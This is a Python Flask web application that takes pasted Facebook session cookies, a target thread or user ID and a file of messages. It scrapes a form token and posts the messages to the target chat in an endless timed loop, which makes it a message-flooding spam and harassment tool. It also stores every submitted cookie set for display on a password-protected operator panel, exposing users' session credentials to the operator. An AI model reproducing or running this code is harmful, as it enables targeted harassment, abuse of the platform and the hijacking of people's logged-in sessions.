from flask import Flask, request, session, redirect, url_for, render_template
import requests
from threading import Thread, Event
import time
import logging
import io
import os
import sys
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = "AXSHU2025SECRETKEYCHANGE"

# ------------------ Logging Setup ------------------
log_stream = io.StringIO()
memory_handler = logging.StreamHandler(log_stream)
memory_handler.setLevel(logging.INFO)

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(logging.INFO)

logging.getLogger().addHandler(memory_handler)
logging.getLogger().addHandler(console_handler)
logging.getLogger().setLevel(logging.INFO)

# ------------------ Globals ------------------
stop_event = Event()
threads = []
users_data = []


# ------------------ PING ------------------
@app.route('/ping')
def ping():
    return "✅ I am alive (cookies version)!", 200


# ------------------ Helper: UID → ThreadId ------------------
def get_thread_id_from_uid(session_req, uid):
    """UID se threadId fetch karega"""
    try:
        r = session_req.get(
            f"https://mbasic.facebook.com/messages/read/?fbid={uid}",
            headers={"User-Agent": "Mozilla/5.0"},
            allow_redirects=True
        )
        # Agar URL me redirect hoke threadId aa gaya
        if "t_" in r.url:
            thread_id = r.url.split("/")[-1]
            return thread_id

        # Fallback: HTML parse karke
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            if "t_" in a["href"]:
                return "t_" + a["href"].split("t_")[-1]
    except Exception as e:
        logging.error(f"❌ UID se threadId fetch nahi ho paya: {e}")
    return None


# ------------------ MESSAGE SENDER ------------------
def send_messages(cookies, thread_id, mn, time_interval, messages):
    session_req = requests.Session()
    session_req.cookies.update(cookies)

    # ✅ fb_dtsg token fetch
    try:
        r = session_req.get("https://mbasic.facebook.com/messages", headers={"User-Agent": "Mozilla/5.0"})
        soup = BeautifulSoup(r.text, "html.parser")
        fb_dtsg = soup.find("input", {"name": "fb_dtsg"})["value"]
    except Exception as e:
        logging.error(f"❌ Failed to fetch fb_dtsg: {e}")
        return

    # ✅ Agar threadId ek UID hai → uska real threadId nikalo
    if not thread_id.startswith("t_"):
        real_thread = get_thread_id_from_uid(session_req, thread_id)
        if real_thread:
            logging.info(f"ℹ️ UID {thread_id} ka threadId mila: {real_thread}")
            thread_id = real_thread
        else:
            logging.error(f"❌ UID {thread_id} ka threadId fetch nahi ho paya")
            return

    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break

                data = {
                    "fb_dtsg": fb_dtsg,
                    "body": f"{mn} {message1}",
                    "tids": thread_id,
                    "wwwupp": "C3",
                }

                resp = session_req.post("https://mbasic.facebook.com/messages/send/", data=data)

                if resp.status_code == 200:
                    logging.info(f"✅ Sent: {message1[:30]}")
                else:
                    logging.warning(f"❌ Fail [{resp.status_code}]: {message1[:30]}")

                time.sleep(time_interval)

        except Exception as e:
            logging.error(f"⚠️ Error in loop: {e}")
            time.sleep(5)


# ------------------ MAIN FORM ------------------
@app.route('/', methods=['GET', 'POST'])
def index():
    global threads, users_data
    if request.method == 'POST':
        # ✅ Cookies input
        cookies_raw = request.form.get('cookies')
        cookies = {}
        for pair in cookies_raw.split(";"):
            if "=" in pair:
                k, v = pair.strip().split("=", 1)
                cookies[k] = v

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        # ✅ Messages (txt file se)
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        users_data.append({
            "cookies": cookies,
            "thread_id": thread_id,
            "prefix": mn,
            "interval": time_interval,
            "messages": messages
        })

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(cookies, thread_id, mn, time_interval, messages))
            thread.start()
            threads = [thread]

    return render_template('index.html')


# ------------------ ADMIN LOGIN ------------------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "AXSHU2025":
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return '''
    <!DOCTYPE html>
    <html>
    <head>
      <title>Admin Login</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="d-flex justify-content-center align-items-center vh-100 text-white" style="background:#000;">
      <div class="p-4 bg-dark rounded" style="width:300px;">
        <h2 class="text-center text-info">MASTER AXSHU PANEL</h2>
        <form method="POST">
          <div class="mb-3">
            <label>Password</label>
            <input type="password" name="password" class="form-control" required>
          </div>
          <button type="submit" class="btn btn-info w-100">Login</button>
        </form>
      </div>
    </body>
    </html>
    '''


# ------------------ ADMIN PANEL ------------------
@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    log_text = log_stream.getvalue()[-5000:]
    return render_template('admin_panel.html', users=[type("Obj", (object,), u) for u in users_data], logs=log_text)


@app.route('/admin/logs')
def get_logs():
    if not session.get('admin'):
        return "Not authorized", 403
    return log_stream.getvalue()[-5000:]


# ------------------ STOP THREADS ------------------
@app.route('/admin/stop', methods=['POST'])
def stop_threads():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    stop_event.set()
    logging.info("🛑 Stopped all message sending threads.")
    return redirect(url_for('admin_panel'))


# ------------------ REMOVE SESSION ------------------
@app.route('/admin/remove/<int:idx>', methods=['POST'])
def remove_user(idx):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    if 0 <= idx < len(users_data):
        users_data.pop(idx)
    return redirect(url_for('admin_panel'))


# ------------------ LOGOUT ------------------
@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))


# ------------------ RUN APP ------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
